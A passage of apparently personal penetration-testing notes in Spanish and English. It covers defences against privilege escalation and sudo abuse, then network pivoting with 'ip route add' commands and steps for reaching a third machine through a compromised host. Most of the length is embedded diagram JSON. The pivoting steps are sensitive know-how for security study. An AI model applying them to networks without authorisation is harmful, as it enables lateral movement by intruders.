■ Bloquear las utilidades del sistema no deseadas o el software que pueda utilizarse para programar tareas.
■ Parchear y actualizar regularmente los servidores web.
■ Desactivar la cuenta de administrador local por defecto.
■ Detectar, reparar y solucionar cualquier fallo o error que se ejecute en los servicios del sistema.

### Defender contra el abuso de los derechos sudo:
■ Implementar una política de contraseñas fuertes para los usuarios sudo.
■ Desactivar el almacenamiento en caché de las contraseñas estableciendo el timestamp_timeout en O, de
modo que cada vez que se ejecute sudo los usuarios deban introducir su contraseña.
■ Separar las cuentas administrativas de nivel sudo de las cuentas regulares del administrador, para evitar el
robo de contraseñas sensibles.
■ Actualizar los permisos y las cuentas de los usuarios a intervalos regulares.
■ Probar los usuarios sudo con acceso a programas que contengan parámetros para la ejecución de código
arbitrario.

</div></div>


# 
<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/pivoting/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">

<div class="markdown-embed-title">

# Pivoting

</div>



- Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
- Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema 
- comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.

| Option                                               | Description                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------- |
| `ip route add "IP descubierta" via "gateway"`        | IP Routing (Acceder a otra IP a la que no tengamos accesibilidad) |
| `ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0` |                                                                   |

![Pasted image 20230909123601.png](/img/user/attachments/Pasted%20image%2020230909123601.png)
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- We gonna Route the traffic
- We need access to the machine 2 and `bg` that session
- `1` is the number **session** background of the hacked machine 2
- We want to reach the `Machine 3`
# Pivoting to the machine 3
<style> .container {font-family: sans-serif; text-align: center;} .button-wrapper button {z-index: 1;height: 40px; width: 100px; margin: 10px;padding: 5px;} .excalidraw .App-menu_top .buttonList { display: flex;} .excalidraw-wrapper { height: 800px; margin: 50px; position: relative;} :root[dir="ltr"] .excalidraw .layer-ui__wrapper .zen-mode-transition.App-menu_bottom--transition-left {transform: none;} </style><script src="https://cdn.jsdelivr.net/npm/react@17/umd/react.production.min.js"></script><script src="https://cdn.jsdelivr.net/npm/react-dom@17/umd/react-dom.production.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@excalidraw/excalidraw@0/dist/excalidraw.production.min.js"></script><div id="Drawing_2024-10-09_2159.11.excalidraw.md1"></div><script>(function(){const InitialData={"type":"excalidraw","version":2,"source":"https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/2.5.1","elements":[{"type":"ellipse","version":1515,"versionNonce":467465514,"index":"a0","isDeleted":false,"id":"fQBtKbC0S7aiuWV88Zvmy","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-328.53300332388307,"y":-87.3010718235081,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":681847018,"groupIds":["ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":null,"boundElements":[{"id":"x4aqg9mOIovGXgSSwjNrz","type":"arrow"}],"updated":1728522396933,"link":null,"locked":false},{"type":"line","version":2419,"versionNonce":1192047274,"index":"a1","isDeleted":false,"id":"7UOpfWFTKwPH5jMyrvBgz","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-324.00792646788403,"y":-41.96098420600208,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1153661866,"groupIds":["Sz-ItYCxKRLomdJJ9rvlI","ELvCJpNxw9R4ywHf6f6VA","S8dhhVHTvVXp2MUC-nd8K","tN93xGftww03Bh3S1VfqF","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":1986,"versionNonce":1290095978,"index":"a2","isDeleted":false,"id":"dzPxUb3AaeM7dxrXQDUwO","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-323.04121978261236,"y":-41.66085790356135,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":787117674,"groupIds":["NHcwVZ55LdWQ2zrVQacig","4f_6nQlO0QIxSaUgDhLGu","Ozf63MAEeL0JxDL16skV5","tN93xGftww03Bh3S1VfqF","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":1838,"versionNonce":2121011242,"index":"a3","isDeleted":false,"id":"y2FfghJATmEEq0NAtjcvd","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-283.5266317123957,"y":-12.577916111103036,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":400824618,"groupIds":["gz0bv2yzDIRwCM6M_CH3t","a35inqxrEbuwDlCB4G4z7","orVVxtzBHI87XYq62UaLo","tN93xGftww03Bh3S1VfqF","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1348,"versionNonce":1066171114,"index":"a4","isDeleted":false,"id":"hjwMQIY5TW0YEFM5ZZLJn","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-307.04437942846306,"y":-82.82214058295028,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":1595630570,"groupIds":["dghkyOJYOhw6-FdzKKnBB","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2472,"versionNonce":1053920682,"index":"a5","isDeleted":false,"id":"o2tfMt4YH0M3s3-Cdul7V","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-320.4395595171906,"y":-57.13207005431639,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":1050367658,"groupIds":["dghkyOJYOhw6-FdzKKnBB","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2255,"versionNonce":560351338,"index":"a6","isDeleted":false,"id":"Xu5DoMFLleFeWroWy9SFP","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-317.2577413353726,"y":-57.57744799954969,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1997468010,"groupIds":["dghkyOJYOhw6-FdzKKnBB","cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":860,"versionNonce":789949226,"index":"a7","isDeleted":false,"id":"p-4G8ZFJJpSujq3uh1N_2","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-294.9840114017881,"y":-23.32599019756924,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":2076259370,"groupIds":["cSH2pNnL-EYNdDClfOP9G","ne-1764VpBLd38hlbdk8q"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522396933,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":59,"versionNonce":960814250,"index":"a8","isDeleted":false,"id":"WH74eQ9U","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-338.70001220703125,"y":1.7312393188476562,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":90.93992614746094,"height":25,"seed":1009627562,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522411969,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 1","rawText":"Machine 1","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 1","autoResize":true,"lineHeight":1.25},{"type":"ellipse","version":1694,"versionNonce":926501930,"index":"a9","isDeleted":false,"id":"vDAPJjuCN-SVzICf1CGYZ","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-160.33300637564088,"y":-78.9010474094456,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":59030326,"groupIds":["Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":null,"boundElements":[{"id":"x4aqg9mOIovGXgSSwjNrz","type":"arrow"},{"id":"XAe0ceNhrlTuPJY38cVQ1","type":"arrow"}],"updated":1728522403287,"link":null,"locked":false},{"type":"line","version":2597,"versionNonce":602735722,"index":"aA","isDeleted":false,"id":"-qksTgXu4iKwV-SpLAi1l","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-155.80792951964185,"y":-33.56095979193958,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":351528054,"groupIds":["ctdXnFkmObh_Cj5_nEej9","d99RXu8N3sG2Hc5ctSBGR","8-QBMBfxmBX3mnE5mMm4x","1CHf1HveABi8eVutq0Gpc","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2164,"versionNonce":694478634,"index":"aB","isDeleted":false,"id":"MDHWKVseSDuENT1eHgiPt","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-154.84122283437017,"y":-33.26083348949885,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":422307254,"groupIds":["QO887oDmhtlII9krIrOiL","5oV_ER1nXJLUu6DSm7g-_","uKG7MR3PQvL8wUSgcgTOi","1CHf1HveABi8eVutq0Gpc","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":2016,"versionNonce":1666347498,"index":"aC","isDeleted":false,"id":"dCNXusX-Tt3jBVB_ZrMQy","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-115.32663476415354,"y":-4.177891697040536,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":1901182710,"groupIds":["XWhqZFsgw2BhJoSoMUPNH","fQcoEYSsoGxQcI6ICRq3r","YUl8fH2yJ3B7C3IkfiLZq","1CHf1HveABi8eVutq0Gpc","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1526,"versionNonce":79733930,"index":"aD","isDeleted":false,"id":"oFZjr8BTMuJZxQ68EL9TD","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-138.84438248022087,"y":-74.42211616888778,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":300576822,"groupIds":["X0Vx566RlgXXYwT_br4XC","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2650,"versionNonce":660242282,"index":"aE","isDeleted":false,"id":"rP-F799ja8LtKLRyxHQh6","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-152.23956256894843,"y":-48.73204564025389,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":383449462,"groupIds":["X0Vx566RlgXXYwT_br4XC","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2433,"versionNonce":2003501610,"index":"aF","isDeleted":false,"id":"yX-WhYsLg-muTaX5OgeTo","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-149.0577443871304,"y":-49.17742358548719,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1466456758,"groupIds":["X0Vx566RlgXXYwT_br4XC","ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1038,"versionNonce":1608330474,"index":"aG","isDeleted":false,"id":"Nqemwrd6O6lvNq_x0-okn","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-126.78401445354592,"y":-14.92596578350674,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":2050462710,"groupIds":["ladpeHuNW0jSt0o7afQhj","Gc7-J_f_34ZIMcAp6H_9v"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"ellipse","version":1670,"versionNonce":1078747818,"index":"aH","isDeleted":false,"id":"T88BR6VpQZh40_aJ4jKeo","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-17.132994168609628,"y":-74.9010474094456,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":450058922,"groupIds":["SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":null,"boundElements":[{"id":"XAe0ceNhrlTuPJY38cVQ1","type":"arrow"}],"updated":1728522404905,"link":null,"locked":false},{"type":"line","version":2574,"versionNonce":899629098,"index":"aI","isDeleted":false,"id":"tNb0XWXU7_BbXhBwVPIHK","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-12.607917312610596,"y":-29.56095979193958,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":363230570,"groupIds":["r-V1JDGmqV6S7wlk0J-xL","_aD9D0iysvKgUy5tYUuDf","0Lg50mLVvCVrJy1K-SxFm","APnObXENS4YYk8hiGIM7H","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2141,"versionNonce":148482794,"index":"aJ","isDeleted":false,"id":"4d5om8MMy3UyxZl4zHGXQ","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-11.641210627338921,"y":-29.26083348949885,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":1690843178,"groupIds":["GGy5O8tKNzriNyfRl-NEn","tlqxIQyVLLVrrHUt4l1_z","8h5JU_IDwZ3g7xPD1iIBU","APnObXENS4YYk8hiGIM7H","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":1993,"versionNonce":1190706602,"index":"aK","isDeleted":false,"id":"GEL9ivPr2gD38W4bepiRX","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":27.87337744287771,"y":-0.1778916970405362,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":1478730474,"groupIds":["E0OmWoDjZ1VkWWT33wzMC","B5qsB-85qXWJcx4ykKfoj","RaEpsOHidTXvjdyla0BRS","APnObXENS4YYk8hiGIM7H","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1503,"versionNonce":2099738730,"index":"aL","isDeleted":false,"id":"fqihoNCFdkQlMmS6WKnTO","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":4.355629726810378,"y":-70.42211616888778,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":172209578,"groupIds":["E0tzH_lFgk9nkZW8QcRnQ","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2627,"versionNonce":1529928490,"index":"aM","isDeleted":false,"id":"Q2OGOpmUEq4UYUUaBM78s","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-9.039550361917179,"y":-44.73204564025389,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":206794858,"groupIds":["E0tzH_lFgk9nkZW8QcRnQ","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2410,"versionNonce":1602217450,"index":"aN","isDeleted":false,"id":"LgRcNgEpFqpnllWe6KNi0","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-5.857732180099163,"y":-45.17742358548719,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":303944490,"groupIds":["E0tzH_lFgk9nkZW8QcRnQ","rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1015,"versionNonce":52402346,"index":"aO","isDeleted":false,"id":"sJOm-fnldRsm5yYB-TKp-","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":16.41599775348533,"y":-10.92596578350674,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":504225258,"groupIds":["rrQab-it8-aHi8Q1C09jy","SsYuFtjPr3WxzWnrV1gAV"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":57,"versionNonce":774135094,"index":"aP","isDeleted":false,"id":"rhM0yJoY","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-184.96996307373047,"y":11.231269836425781,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":96.39993286132812,"height":25,"seed":1936015338,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522098218,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 2","rawText":"Machine 2","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 2","autoResize":true,"lineHeight":1.25},{"type":"text","version":89,"versionNonce":2037692982,"index":"aQ","isDeleted":false,"id":"UDTzstsv","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-53.30000305175781,"y":8.831275939941406,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":94.55992126464844,"height":25,"seed":1712518826,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522104633,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 3","rawText":"Machine 3","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 3","autoResize":true,"lineHeight":1.25},{"type":"arrow","version":225,"versionNonce":1666332394,"index":"aR","isDeleted":false,"id":"x4aqg9mOIovGXgSSwjNrz","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-264.2681932391289,"y":-49.402133295028634,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":95.69889500388965,"height":1.3261800351567956,"seed":1455462122,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522403288,"link":null,"locked":false,"startBinding":{"elementId":"fQBtKbC0S7aiuWV88Zvmy","focus":-0.011352988561638857,"gap":1,"fixedPoint":null},"endBinding":{"elementId":"vDAPJjuCN-SVzICf1CGYZ","focus":0.17927962136516326,"gap":8.741421371505965,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[95.69889500388965,1.3261800351567956]],"elbowed":false},{"type":"arrow","version":205,"versionNonce":918453610,"index":"aS","isDeleted":false,"id":"XAe0ceNhrlTuPJY38cVQ1","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-82.36877903101973,"y":-43.964689127112905,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":63.334710183076766,"height":0.32219046187323386,"seed":154912234,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728522404905,"link":null,"locked":false,"startBinding":{"elementId":"vDAPJjuCN-SVzICf1CGYZ","focus":-0.020555115383270574,"gap":14.788020110237877,"fixedPoint":null},"endBinding":{"elementId":"T88BR6VpQZh40_aJ4jKeo","focus":0.20371971304660677,"gap":2.5033361665341793,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[63.334710183076766,-0.32219046187323386]],"elbowed":false},{"type":"text","version":214,"versionNonce":1691863082,"index":"aT","isDeleted":false,"id":"fbrRatY6","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-334.56998443603516,"y":30.031227111816406,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":87.63990783691406,"height":25,"seed":963117686,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728522413385,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Attacker","rawText":"Attacker","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Attacker","autoResize":true,"lineHeight":1.25},{"id":"2zxwRecD","type":"text","x":-264.8700256347656,"y":-89.66929659290639,"width":88.83990478515625,"height":25,"angle":0,"strokeColor":"#1e1e1e","backgroundColor":"transparent","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"groupIds":[],"frameId":null,"index":"aV","roundness":null,"seed":668494326,"version":134,"versionNonce":1402510390,"isDeleted":false,"boundElements":null,"updated":1728522600999,"link":null,"locked":false,"text"